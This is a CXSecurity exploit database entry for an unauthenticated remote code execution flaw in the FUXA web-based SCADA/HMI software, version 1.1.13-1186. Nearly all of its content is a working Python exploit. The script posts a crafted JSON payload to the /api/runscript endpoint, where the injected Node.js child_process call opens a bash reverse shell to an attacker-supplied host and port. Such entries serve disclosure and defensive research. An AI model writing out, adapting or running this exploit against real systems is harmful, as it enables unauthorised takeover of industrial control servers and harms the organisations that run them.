---
title: FUXA 1.1.13-1186 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023040072
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-22
fetch_date: 2025-10-04T11:32:26.152849
---

# FUXA 1.1.13-1186 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **FUXA 1.1.13-1186 Remote Code Execution** **2023.04.21**  Credit:  **[Rodolfo Mariano](https://cxsecurity.com/author/Rodolfo%2BMariano/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: FUXA V.1.1.13-1186- Unauthenticated Remote Code Execution (RCE)
# Date: 18/04/2023
# Exploit Author: Rodolfo Mariano
# Vendor Homepage: https://github.com/frangoteam/FUXA
# Version: FUXA V.1.1.13-1186 (current)
from argparse import RawTextHelpFormatter
import argparse, sys, threading, requests
def main(rhost, rport, lhost, lport):
url = "http://"+rhost+":"+rport+"/api/runscript"
payload = {
"headers":
{
"normalizedNames":{},
"lazyUpdate": "null"
},
"params":{
"script":{
"parameters":[
{
"name":"ok",
"type":"tagid",
"value":""
}
],
"mode":"",
"id":"",
"test":"true",
"name":"ok",
"outputId":"",
"code":"require('child\_process').exec('/bin/bash -c \"/bin/sh -i >& /dev/tcp/%s/%s 0>&1\"')" % (lhost,lport)
}
}
}
response = requests.post(url, json=payload)
args = None
parser = argparse.ArgumentParser(formatter\_class=RawTextHelpFormatter, usage="python exploit.py --rhosts <ip> --rport <rport>--lport <port>")
parser.add\_argument('--rhost', dest='rhost', action='store', type=str, help='insert an rhost')
parser.add\_argument('--rport', dest='rport', action='store', type=str, help='insert an rport', default=1881)
parser.add\_argument('--lhost', dest='lhost', action='store', type=str, help='insert an lhost')
parser.add\_argument('--lport', dest='lport', action='store', type=str, help='insert an lport')
args=parser.parse\_args()
main(args.rhost, args.rport, args.lhost, args.lport)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040072)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top